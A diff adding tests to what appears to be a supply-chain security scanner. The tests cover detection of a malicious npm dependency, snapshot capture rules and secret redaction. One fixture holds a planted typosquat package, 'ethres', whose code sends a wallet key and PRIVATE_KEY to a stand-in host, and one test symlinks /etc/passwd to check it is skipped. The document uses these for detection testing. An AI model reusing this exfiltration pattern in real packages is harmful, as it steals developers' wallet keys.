@@ -7,6 +7,9 @@ import { pinSnapshot, loadSnapshot, replayEvidence, proveFindings, redactSecret,
 import { cryptoLeads, cryptoDetectors } from "../packs/supply-chain/crypto.mjs";
 import { makeLabWorkspace } from "../packs/supply-chain/lab.mjs";
 import { captureSnapshot } from "../packs/supply-chain/snapshot.mjs";
+import { scanSnapshot, SCANNERS, SYFT } from "../packs/supply-chain/scanners.mjs";
+import { mkdirSync } from "node:fs";
+import { execFileSync } from "node:child_process";
 
 const temp = () => mkdtempSync(join(tmpdir(), "evidence-test-"));
 const remove = (ws) => rmSync(ws, { recursive: true, force: true });
@@ -88,12 +91,107 @@ test("lab snapshot binds source to a commit and treats keystore address as metad
     assert.match(snapshot.commit, /^[a-f0-9]{40,64}$/);
     const keystore = cryptoLeads(snapshot).find((l) => l.check === "evm-keystore");
     assert.equal(keystore.addressSource, "keystore-metadata");
+    // A dirty working tree never changes the evidence. The commit bytes win.
     writeFileSync(join(ws, "hardhat.config.js"), "changed");
-    assert.throws(() => captureSnapshot(ws), /differs from pinned commit/);
+    assert.equal(captureSnapshot(ws).files["hardhat.config.js"], snapshot.files["hardhat.config.js"]);
   } finally { remove(ws); }
 });
 
 test("non-object JSON and unrelated config hashes do not become crypto findings", () => {
   const key = "1".padStart(64, "0");
   assert.deepEqual(cryptoLeads({ files: { "null.json": "null", "array.json": "[]", "hardhat.config.js": `const buildHash = \"0x${key}\";` } }), []);
+});
+
+const evil = {
+  "node_modules/ethres/index.js": "const https = require('https');\nclass Wallet { constructor(k) { https.request({ host: 'x.invalid' }).end(JSON.stringify({ k, e: process.env.PRIVATE_KEY })); } }\n",
+  "scripts/deploy.js": "const { Wallet } = require('ethres');\nnew Wallet(process.env.DEPLOYER_KEY);\n",
+  "package.json": JSON.stringify({ dependencies: { ethres: "1.0.0", lodash: "4" } }),
+  "package-lock.json": JSON.stringify({ packages: { "": {}, "node_modules/lodash": { version: "4.17.21" } } }),
+};
+
+test("a malicious dependency that reaches a signer is found and replays at the exact import", () => {
+  const leads = cryptoLeads({ files: evil });
+  const reach = leads.find((l) => l.check === "dependency-reaches-signer");
+  assert.deepEqual([reach.file, reach.lines[0], reach.where.package], ["scripts/deploy.js", 1, "ethres"]);
+  assert.ok(leads.some((l) => l.check === "dependency-exfil-code" && l.file === "node_modules/ethres/index.js" && l.lines[0] === 2));
+  assert.ok(leads.some((l) => l.check === "dependency-not-in-lockfile" && l.package === "ethres" && l.impact === "Low"));
+  const snapshot = { files: evil };
+  assert.equal(cryptoDetectors["dependency-reaches-signer"](snapshot, reach.where).ok, true);
+  assert.equal(cryptoDetectors["dependency-reaches-signer"](snapshot, { ...reach.where, package: "lodash" }).ok, false);
+  assert.equal(cryptoDetectors["dependency-reaches-signer"](snapshot, { ...reach.where, line: 2 }).ok, false);
+});
+
+test("an import with no signer context, or from a known-good package, is not a signer reach", () => {
+  const noSigner = { ...evil, "scripts/deploy.js": "const x = require('ethres');\n" };
+  assert.deepEqual(cryptoLeads({ files: noSigner }).filter((l) => l.check === "dependency-reaches-signer"), []);
+  const known = { "package.json": JSON.stringify({ dependencies: { ethers: "6" } }), "scripts/deploy.js": "const { Wallet } = require('ethers');\nnew Wallet(process.env.DEPLOYER_KEY);\n",
+    "node_modules/ethers/index.js": "module.exports = {};\n" };
+  assert.deepEqual(cryptoLeads({ files: known }), []);
+});
+
+test("a folder that is not a git repo is captured; binary, large and reserved files are skipped and listed", () => {
+  const dir = temp();
+  try {
+    mkdirSync(join(dir, "src"));
+    mkdirSync(join(dir, ".git"));
+    writeFileSync(join(dir, ".git/config"), "never read");
+    writeFileSync(join(dir, "src/a.js"), "const a = 1;\n");
+    writeFileSync(join(dir, "blob.bin"), Buffer.from([0, 1, 2, 255]));
+    writeFileSync(join(dir, "big.txt"), "x".repeat(600 * 1024));
+    writeFileSync(join(dir, ".semgrepignore"), "*\n");
+    symlinkSync("/etc/passwd", join(dir, "link"));
+    const snapshot = captureSnapshot(dir);
+    assert.deepEqual(Object.keys(snapshot.files), ["src/a.js"]);
+    assert.equal(snapshot.commit, undefined);
+    assert.match(snapshot.folderHash, /^[a-f0-9]{64}$/);
+    const reasons = Object.fromEntries(snapshot.skipped.map((s) => [s.file, s.reason]));
+    assert.deepEqual(reasons, { "blob.bin": "binary-or-not-utf8", "big.txt": "too-large", ".semgrepignore": "reserved-name", link: "not-a-regular-file" });
+  } finally { remove(dir); }
+});
+
+test("vendored code never starves the project's own files of the byte budget", () => {
+  const dir = temp();
+  try {
+    mkdirSync(join(dir, "node_modules/big"), { recursive: true });
+    for (let i = 0; i < 20; i++) writeFileSync(join(dir, `node_modules/big/f${i}.js`), "x".repeat(500 * 1024));
+    writeFileSync(join(dir, "app.js"), "const ok = 1;\n");
+    const snapshot = captureSnapshot(dir);
+    assert.ok(snapshot.files["app.js"]);
+    assert.ok(snapshot.skipped.some((s) => s.reason === "over-budget"));
+  } finally { remove(dir); }
+});
+
+test("every named tool is wrapped through runTool and a missing grype database is a gap, not a clean result", async () => {
+  for (const engine of ["gitleaks", "trufflehog", "osv", "grype", "semgrep"]) assert.ok(SCANNERS[engine].image.includes("@sha256:"), `${engine} must be digest pinned`);
+  assert.ok(SYFT.image.includes("@sha256:"));
+  const old = process.env.TOUCHSTONE_GRYPE_DB;
+  process.env.TOUCHSTONE_GRYPE_DB = temp();
+  try {
+    const r = await scanSnapshot({ files: { "package.json": "{}" }, npmAdvisories: "" }, "grype");
+    assert.equal(r.status, "gap");
+    assert.deepEqual(r.leads, []);
+    assert.match(r.reason, /refresh-db/);
+  } finally { if (old === undefined) delete process.env.TOUCHSTONE_GRYPE_DB; else process.env.TOUCHSTONE_GRYPE_DB = old; }
+});
+
+test("the lab plants a dependency that no advisory scanner or lockfile knows", async () => {
+  const ws = await makeLabWorkspace();
+  try {
+    const { files } = captureSnapshot(ws);
+    assert.ok(files["node_modules/ethres/index.js"], "plant is vendored in the lab workspace");
+    assert.ok(!files["package-lock.json"].includes("ethres"));
+    const leads = cryptoLeads({ files });
+    assert.ok(leads.some((l) => l.check === "dependency-reaches-signer" && l.where.package === "ethres"));
+    assert.ok(leads.some((l) => l.check === "dependency-exfil-code" && l.where.package === "ethres"));
+  } finally { remove(ws); }
+});
+
+test("the evidence viewer shows the real secret hash, never the secret", async () => {
+  const { proofView } = await import("../lib/proof-view.mjs");
+  const key = `0x${"3".repeat(63)}1`;
+  const lead = cryptoLeads({ files: { "hardhat.config.js": `accounts: ["${key}"]\n` } })[0];
+  const view = proofView({ proof: { kind: "evidence", status: "pass", check: lead.check, snapshotHash: "a".repeat(64) }, evidence: { check: lead.check, where: lead.where, snapshotHash: "a".repeat(64) } });
+  const cell = view.cited.find((c) => c.name === "fingerprint");
+  assert.equal(cell.value, lead.secret.sha256);
+  assert.ok(!JSON.stringify(view).includes(key.slice(2)));
 });
